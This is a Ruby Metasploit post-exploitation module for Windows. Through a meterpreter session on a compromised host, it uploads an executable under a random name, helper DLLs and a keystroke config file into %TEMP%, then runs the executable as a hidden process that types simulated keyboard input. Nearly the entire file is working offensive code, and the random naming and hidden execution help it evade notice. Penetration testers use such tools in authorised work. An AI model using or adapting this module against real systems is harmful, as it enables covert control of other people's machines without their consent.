##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
  
require 'msf/core'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv
  include Post::Common

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Post Write Into Screen',
      'Description'   => %q{
        This module will upload the write into screen executable and config files to the target environment,
	and execute it. It will simulate the keyboard events defined in the config file.
	For more info, visit: https://github.com/MRGEffitas/Write-into-screen
        
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'Zoltan Balazs <zoltan1.balazs[at]gmail.com>',
          'michaelnoonan',
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [ 'URL', 'https://github.com/MRGEffitas/Write-into-screen/' ],
        [ 'URL', 'https://inputsimulator.codeplex.com/' ],
      ],
      'DisclosureDate'=> "Aug 8 2014"
    ))
    register_options(
      [
        OptString.new('CONFIGJSON',[true, 'Path to the config.json file',]),

      ], self.class)
  end

  def exploit 
    validate_environment!

    upload_binaries!

    print_status("Executing uploaded files")
    # execute the write into screen binaries
    cmd =  "cmd.exe /c start /d#{expand_path("%TEMP%")} /b  #{path_write_into_screen_exe}"
    print_status(cmd)
    r = session.sys.process.execute( cmd, nil,{'Hidden' => true})
  end

  def path_write_into_screen_exe
    @binary_path_exe ||= "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.exe"
  end

  def validate_environment!
    winver = sysinfo["OS"]

    unless winver =~ /Windows XP|Windows Vista|Windows 2008|Windows [78]|Windows 2012/
      fail_with(Exploit::Failure::NotVulnerable, "#{winver} is not compatible.")
    end
    print_status("Compatible #{winver} found.")
  end

  def upload_binaries!
    print_status("Uploading the files to the filesystem....")

    #
    # Generate payload and random names for upload
    #
    path = ::File.join(Msf::Config.data_directory, "post/write_into_screen")
    bpexe = ::File.join(path, "write_into_screen.exe")
    inputsimulator_dll = ::File.join(path, "InputSimulator.dll")
    json_dll = ::File.join(path, "Newtonsoft.Json.dll")
    config_json = ::File.join(path, "config.json")
    print_status("Uploading the write into screen executable, dlls and config to the filesystem...")

    begin
      #
      # Upload write into screen binaries and config to the filesystem
      #
      upload_file("#{path_write_into_screen_exe}", bpexe)
      print_status("Write into screen (#{path_write_into_screen_exe}) executable uploaded..")
      upload_file("#{expand_path("%TEMP%")}\\InputSimulator.dll", inputsimulator_dll)
      print_status("#{expand_path("%TEMP%")}\\InputSimulator.dll uploaded")
      upload_file("#{expand_path("%TEMP%")}\\Newtonsoft.Json.dll", json_dll)
      print_status("#{expand_path("%TEMP%")}\\Newtonsoft.Json.dll uploaded")
      upload_file("#{expand_path("%TEMP%")}\\config.json", config_json)
      print_status("#{expand_path("%TEMP%")}\\config.json uploaded")
    rescue ::Exception => e
      print_error("Error uploading file : #{e.class} #{e}")
      #return
    end
  end
end

